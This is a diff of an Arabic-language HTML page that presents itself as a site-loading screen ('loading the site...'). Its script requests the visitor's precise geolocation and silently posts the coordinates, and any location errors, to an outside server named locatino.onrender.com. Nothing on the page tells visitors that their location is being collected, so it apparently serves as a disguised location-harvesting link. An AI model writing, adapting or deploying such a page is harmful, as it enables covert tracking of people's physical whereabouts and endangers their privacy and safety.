@@ -1,97 +1,51 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <h1>fffffffffff</h1></h1>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحميل الموقع</title>
 </head>
 <body>
-    <h2 id="status-display">جاري تحميل الموقع...</h2>
+    <h2>جاري تحميل الموقع...</h2>
 
 <script>
-    // ** الرابط الفعلي لمشروعك على Render **
-    const RENDER_APP_URL = "https://locatino.onrender.com";
-    const statusDisplay = document.getElementById('status-display');
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(sendLocation, sendError);
+} else {
+    console.error("المتصفح لا يدعم تحديد الموقع.");
+}
 
-    // 1. طلب إذن الموقع من المتصفح
-    if ("geolocation" in navigator) {
-        // نطلب الموقع بدقة عالية ومهلة 10 ثواني
-        navigator.geolocation.getCurrentPosition(sendLocation, sendError, {
-            enableHighAccuracy: true,
-            timeout: 10000, 
-            maximumAge: 0 
-        });
-    } else {
-        statusDisplay.textContent = "المتصفح لا يدعم تحديد الموقع.";
-        console.error("المتصفح لا يدعم تحديد الموقع.");
-    }
+function sendLocation(position) {
+    const data = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy
+    };
 
-    // 2. دالة إرسال الموقع بنجاح
-    function sendLocation(position) {
-        statusDisplay.textContent = "تم تحديد الموقع بنجاح. جاري الإرسال إلى السيرفر...";
-        
-        const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            timestamp: new Date().toISOString() // إضافة الوقت والتاريخ
-        };
+    fetch("https://locatino.onrender.com", {  // غير هذا إلى رابط سيرفرك
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(text => console.log("Server response:", text))
+    .catch(error => console.error("خطأ في إرسال الموقع:", error));
+}
 
-        // ** إرسال البيانات إلى المسار /location **
-        fetch(`${RENDER_APP_URL}/location`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => {
-            if (response.ok) {
-                statusDisplay.textContent = `✅ تم إرسال الموقع بنجاح! الإحداثيات: ${data.latitude}, ${data.longitude}`;
-                return response.text();
-            } else {
-                // إذا رد الخادم بخطأ (مثل 404 أو 500)
-                throw new Error(`خطأ من الخادم: ${response.status} ${response.statusText}`);
-            }
-        })
-        .then(text => console.log("استجابة الخادم:", text))
-        .catch(error => {
-            statusDisplay.textContent = `❌ فشل الإرسال إلى السيرفر: ${error.message}`;
-            console.error("خطأ في إرسال الموقع:", error);
-        });
-    }
-
-    // 3. دالة معالجة أخطاء تحديد الموقع
-    function sendError(error) {
-        let errorMessage;
-        
-        if (error.code === 1) {
-            errorMessage = "تم رفض إذن تحديد الموقع من قبل المستخدم.";
-        } else if (error.code === 2) {
-            errorMessage = "الموقع غير متوفر حالياً.";
-        } else if (error.code === 3) {
-            errorMessage = "انتهت مهلة البحث عن الموقع.";
-        } else {
-            errorMessage = error.message;
-        }
-
-        statusDisplay.textContent = `❌ خطأ في تحديد الموقع: ${errorMessage}`;
-        console.error("خطأ تحديد الموقع:", errorMessage);
-        
-        // إرسال رسالة الخطأ إلى المسار /error لتسجيل الأخطاء في السيرفر
-        fetch(`${RENDER_APP_URL}/error`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ error: errorMessage, code: error.code })
-        })
-        .then(() => console.log("تم إرسال سجل الخطأ بنجاح."))
-        .catch(err => console.error("فشل إرسال سجل الخطأ:", err));
-    }
+function sendError(error) {
+    fetch("https://locatino.onrender.com", {  // غير هذا إلى رابط سيرفرك
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({error: error.message})
+    })
+    .then(response => response.text())
+    .then(text => console.log("Server error response:", text))
+    .catch(err => console.error("خطأ في إرسال الخطأ:", err));
+}
 </script>
 
 </body>
 </html>
-
